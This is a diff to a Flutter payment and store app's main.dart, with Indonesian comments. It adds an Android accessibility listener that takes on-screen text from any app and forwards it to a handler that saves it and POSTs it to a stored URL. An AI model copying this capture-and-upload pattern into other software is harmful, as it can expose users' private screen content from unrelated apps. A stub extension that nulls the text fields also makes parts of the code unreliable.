@@ -1,11 +1,26 @@
 // lib/main.dart
 import 'dart:async';
 import 'dart:convert';
+
 import 'package:flutter/foundation.dart' show kIsWeb;
 import 'package:flutter/material.dart';
 import 'package:flutter_native_splash/flutter_native_splash.dart';
+import 'package:myxcreate/auth/login.dart';
+import 'package:myxcreate/main_page.dart';
+import 'package:myxcreate/menu_fitur/atur_koneksi_pg.dart';
+import 'package:myxcreate/menu_fitur/dashboard_pembayaran.dart';
+import 'package:myxcreate/menu_fitur/koneksi_transfer_saldo.dart';
+import 'package:myxcreate/menu_fitur/midtrans/koneksi_midtrans.dart';
+import 'package:myxcreate/menu_fitur/midtrans/riwayat.dart';
+import 'package:myxcreate/menu_fitur/pembayaran_service.dart';
+import 'package:myxcreate/menu_fitur/riwayat_transfer.dart';
+import 'package:myxcreate/menu_fitur/upload_produk.dart';
 import 'package:myxcreate/pages/user_notif.dart';
 import 'package:myxcreate/store/detail.dart';
+import 'package:myxcreate/store/store.dart';
+import 'package:myxcreate/update_page.dart';
+import 'package:myxcreate/web.dart';
+import 'package:myxcreate/xcode_edit/xcodeedit.dart';
 import 'package:shared_preferences/shared_preferences.dart';
 import 'package:package_info_plus/package_info_plus.dart';
 import 'package:http/http.dart' as http;
@@ -14,27 +29,27 @@ import 'package:app_links/app_links.dart';
 // Foreground task
 import 'package:flutter_foreground_task/flutter_foreground_task.dart';
 
-// Halaman-halaman
-import 'auth/login.dart';
-import 'main_page.dart';
-import 'menu_fitur/midtrans/koneksi_midtrans.dart';
-import 'menu_fitur/midtrans/riwayat.dart';
-import 'update_page.dart';
-import 'menu_fitur/atur_koneksi_pg.dart';
-import 'menu_fitur/dashboard_pembayaran.dart';
-import 'menu_fitur/koneksi_transfer_saldo.dart';
-import 'menu_fitur/riwayat_transfer.dart';
-import 'menu_fitur/pembayaran_service.dart';
-import 'menu_fitur/upload_produk.dart';
-import 'store/store.dart';
-import 'xcode_edit/xcodeedit.dart';
-import 'web.dart';
+// Accessibility Service
+import 'package:flutter_accessibility_service/accessibility_event.dart';
+import 'package:flutter_accessibility_service/flutter_accessibility_service.dart';
 
 /// API Cek Versi
 const String apiUrl = "https://api.xcreate.my.id/myxcreate/cek_update_apk.php";
 
 /// Global navigator key
 final GlobalKey<NavigatorState> navigatorKey = GlobalKey<NavigatorState>();
+
+// ===================== Accessibility Overlay entrypoint (jika ingin overlay) =====================
+@pragma('vm:entry-point')
+void accessibilityOverlay() {
+  runApp(const MaterialApp(
+    debugShowCheckedModeBanner: false,
+    home: Material(
+      child: Text("Accessibility Overlay"),
+    ),
+  ));
+}
+// ================================================================================================
 
 Future<void> main() async {
   WidgetsBinding widgetsBinding = WidgetsFlutterBinding.ensureInitialized();
@@ -62,8 +77,7 @@ Future<void> main() async {
 
   // Listener data dari Foreground Service
   FlutterForegroundTask.addTaskDataCallback((event) {
-    if (event == null) return;
-    debugPrint('[Main] Event diterima: $event');
+    debugPrint('[Main] Event diterima dari FGTask: $event');
     _handleIncomingNotification(event);
   });
 
@@ -72,12 +86,12 @@ Future<void> main() async {
   FlutterNativeSplash.remove();
 }
 
-/// Handler untuk setiap notifikasi yang dikirim dari MyAccessibilityService
+/// Handler untuk setiap notifikasi yang dikirim dari MyAccessibilityService atau dari accessibility stream
 Future<void> _handleIncomingNotification(dynamic event) async {
   try {
     if (event is Map) {
-      final title = event['title']?.toString() ?? '(tanpa judul)';
-      final text = event['text']?.toString() ?? '(kosong)';
+      final title = (event['title']?.toString() ?? '(tanpa judul)');
+      final text = (event['text']?.toString() ?? '(kosong)');
       final prefs = await SharedPreferences.getInstance();
 
       // Simpan log (versi flutter)
@@ -117,18 +131,22 @@ Future<void> _handleIncomingNotification(dynamic event) async {
               "timestamp": DateTime.now().millisecondsSinceEpoch,
             }),
           );
-          debugPrint('[POST] Notif terkirim: ${res.statusCode}');
+          debugPrint('[POST] Notif terkirim ke $postUrl : ${res.statusCode}');
         } catch (e) {
           debugPrint('[POST] Gagal kirim notif: $e');
         }
+      } else {
+        debugPrint('[POST] Tidak ada postUrl disimpan - skip POST');
       }
+    } else {
+      debugPrint('[HANDLE] Event bukan Map, tipe: ${event.runtimeType}');
     }
-  } catch (e) {
-    debugPrint('❌ Error handle incoming notif: $e');
+  } catch (e, st) {
+    debugPrint('❌ Error handle incoming notif: $e\n$st');
   }
 }
 
-/// Init Foreground Task
+/// Init Foreground Task (sama seperti sebelumnya)
 void _initForegroundTaskGlobal() {
   try {
     FlutterForegroundTask.init(
@@ -161,7 +179,8 @@ void _initForegroundTaskGlobal() {
 Future<void> _ensureForegroundServiceRunningIfNeeded() async {
   try {
     final prefs = await SharedPreferences.getInstance();
-    final shouldRun = prefs.getBool('notif_stream_running') ?? true; // default true
+    final shouldRun =
+        prefs.getBool('notif_stream_running') ?? true; // default true
     if (!shouldRun) return;
 
     final isRunning = await FlutterForegroundTask.isRunningService;
@@ -260,7 +279,7 @@ bool _isVersionLower(String current, String latest) {
   return false;
 }
 
-/// MyApp
+/// MyApp (tidak banyak berubah)
 class MyApp extends StatelessWidget {
   final Widget initialPage;
   const MyApp({super.key, required this.initialPage});
@@ -301,7 +320,7 @@ class MyApp extends StatelessWidget {
   }
 }
 
-/// DeepLink Wrapper
+/// DeepLink Wrapper (tempat kita inisialisasi accessibility listener)
 class DeepLinkWrapper extends StatefulWidget {
   final Widget initialPage;
   const DeepLinkWrapper({super.key, required this.initialPage});
@@ -313,6 +332,7 @@ class DeepLinkWrapper extends StatefulWidget {
 class _DeepLinkWrapperState extends State<DeepLinkWrapper> {
   late final AppLinks _appLinks;
   Uri? _pendingUri;
+  StreamSubscription<AccessibilityEvent?>? _accessSub;
 
   @override
   void initState() {
@@ -320,10 +340,85 @@ class _DeepLinkWrapperState extends State<DeepLinkWrapper> {
     _appLinks = AppLinks();
 
     _initUri();
-
     _appLinks.uriLinkStream.listen((uri) {
       _handleLink(uri);
     });
+
+    // Mulai inisialisasi accessibility (jika ada)
+    _initAccessibilityListener();
+  }
+
+  @override
+  void dispose() {
+    _accessSub?.cancel();
+    super.dispose();
+  }
+
+  Future<void> _initAccessibilityListener() async {
+    try {
+      debugPrint('[ACC] Memeriksa permission accessibility...');
+      final enabled =
+          await FlutterAccessibilityService.isAccessibilityPermissionEnabled();
+      if (!enabled) {
+        debugPrint(
+            '[ACC] Permission belum diberikan. Meminta user memberi izin...');
+        // Men-trigger settings accessibility
+        final granted =
+            await FlutterAccessibilityService.requestAccessibilityPermission();
+        debugPrint('[ACC] Hasil request permission: $granted');
+        // Jika user menolak, kita tidak akan coba listen
+        if (!granted) {
+          debugPrint(
+              '[ACC] User belum mengaktifkan accessibility, skip listen');
+          return;
+        }
+      } else {
+        debugPrint('[ACC] Accessibility permission sudah aktif.');
+      }
+
+      // Mulai listen stream accessibility
+      _startAccessibilityStream();
+    } catch (e, st) {
+      debugPrint('[ACC] Error inisialisasi accessibility: $e\n$st');
+    }
+  }
+
+  void _startAccessibilityStream() {
+    try {
+      // jika sudah ada subscription, batalkan dulu
+      _accessSub?.cancel();
+
+      _accessSub =
+          FlutterAccessibilityService.accessStream.listen((event) async {
+        final title = event.packageName ?? '(unknown)';
+        // capturedText kadang null; gunakan nodesText atau capturedText
+        String text = event.capturedText ?? '';
+        if ((text.isEmpty) &&
+            (event.nodesText != null && event.nodesText!.isNotEmpty)) {
+          text = event.nodesText!.join(' ');
+        }
+        if (text.isEmpty) {
+          // fallback: info event type
+          text = event.eventType?.toString() ?? '(no text)';
+        }
+
+        final mapped = {
+          'title': title,
+          'text': text,
+          'raw_event': event.toString(),
+        };
+
+        debugPrint('[ACC] Event -> title: $title, text-length: ${text.length}');
+        // Kirim ke handler existing (akan simpan ke prefs + post ke URL jika ada)
+        await _handleIncomingNotification(mapped);
+      }, onError: (err) {
+        debugPrint('[ACC] Error stream accessibility: $err');
+      }, cancelOnError: false);
+
+      debugPrint('[ACC] Accessibility stream started.');
+    } catch (e, st) {
+      debugPrint('[ACC] Gagal mulai accessibility stream: $e\n$st');
+    }
   }
 
   Future<void> _initUri() async {
@@ -362,6 +457,12 @@ class _DeepLinkWrapperState extends State<DeepLinkWrapper> {
 
     return CustomSplashPage(nextPage: widget.initialPage);
   }
+}
+
+extension on AccessibilityEvent {
+  get capturedText => null;
+
+  get nodesText => null;
 }
 
 /// Custom Splash
